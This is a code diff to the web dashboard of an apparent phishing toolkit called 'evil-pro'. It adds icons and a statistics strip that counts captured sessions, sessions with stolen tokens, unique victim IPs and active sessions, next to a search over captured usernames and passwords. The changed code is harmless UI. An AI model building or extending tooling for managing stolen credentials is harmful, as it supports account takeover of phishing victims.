@@ -68,7 +68,10 @@ var ICO = {
   logout: '<path d="M15 4h3a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2h-3"/><path d="M10 8l-4 4 4 4M6 12h9"/>',
   csv: '<path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="M14 3v5h5"/>',
   menu: '<path d="M4 7h16M4 12h16M4 17h16"/>',
-  shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/>'
+  shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/>',
+  key: '<circle cx="8" cy="15" r="3.5"/><path d="M10.6 12.4 20 3M17 6l3 3M14 9l2.5 2.5"/>',
+  globe: '<circle cx="12" cy="12" r="8.5"/><path d="M3.5 12h17M12 3.5c2.4 2.4 3.7 5.4 3.7 8.5s-1.3 6.1-3.7 8.5c-2.4-2.4-3.7-5.4-3.7-8.5S9.6 5.9 12 3.5z"/>',
+  activity: '<path d="M3 12h4l2.5-6 4 12L16 12h5"/>'
 };
 function ico(n, cls) {
   if (!ICO[n]) return '';
@@ -80,7 +83,7 @@ function renderChrome() {
   var rate = stats.total_sessions ? Math.round(stats.with_tokens / stats.total_sessions * 100) : 0;
   $('#side').innerHTML =
     '<div class="side-head">' +
-      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="8" fill="#6366f1"/><path d="M18 6 9 18h5l-1 8 9-12h-5z" fill="#fff"/></svg>' +
+      '<svg class="mark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M13.4 2.6 6 13.2h4.6L9.4 21.4 17 10.6h-4.6z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round" stroke-linecap="round"/></svg>' +
       '<div class="side-brand">evil-pro<small>dashboard</small></div>' +
     '</div>' +
     '<nav class="nav">' +
@@ -102,6 +105,25 @@ function renderChrome() {
     '<button class="btn sm" data-act="logout">' + ico('logout') + ' Logout</button>';
 }
 
+/* ---------------- compact stats ---------------- */
+function statCard(icon, label, value, sub, tone) {
+  return '<div class="statcard ' + (tone || '') + '">' +
+    '<span class="chipico">' + ico(icon) + '</span>' +
+    '<div><div class="sl">' + esc(label) + '</div><div class="sv">' + esc(value) + '</div>' +
+    (sub ? '<div class="ss">' + esc(sub) + '</div>' : '') + '</div></div>';
+}
+function statStrip() {
+  var s = S.stats || {};
+  var total = s.total_sessions || 0;
+  var pct = total ? Math.round((s.with_tokens || 0) / total * 100) : 0;
+  return '<div class="grid stats mb14">' +
+    statCard('sessions', 'Sessions', total, 'captured so far', '') +
+    statCard('key', 'With tokens', s.with_tokens || 0, pct + '% of sessions', 'hot') +
+    statCard('globe', 'Unique IPs', s.unique_ips || 0, 'distinct sources', '') +
+    statCard('activity', 'Active now', s.active_sessions || 0, 'seen in the last 5 min', s.active_sessions ? 'live' : '') +
+  '</div>';
+}
+
 /* ---------------- sessions ---------------- */
 async function render() {
   try {
@@ -119,6 +141,7 @@ async function render() {
     }).join('');
 
     $('#content').innerHTML =
+      statStrip() +
       '<div class="toolbar">' +
         '<div class="search grow"><input id="fSearch" placeholder="Search username, password, IP, user-agent…" value="' + esc(S.q.search) + '"></div>' +
         '<select id="fPl" style="width:auto"><option value="">All phishlets</option>' + phopts + '</select>' +
